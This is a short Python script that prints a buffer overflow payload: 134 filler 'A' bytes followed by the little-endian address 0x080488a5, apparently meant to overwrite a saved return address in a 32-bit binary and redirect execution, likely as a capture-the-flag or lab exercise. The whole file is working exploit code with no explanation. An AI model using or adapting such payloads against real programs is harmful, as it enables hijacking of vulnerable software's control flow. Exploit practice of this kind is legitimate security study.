#!/usr/bin/env python3

import sys

#080488a5
sys.stdout.buffer.write(b'A' * 134 + bytearray(b'\xa5\x88\x04\x08') + b'\n')
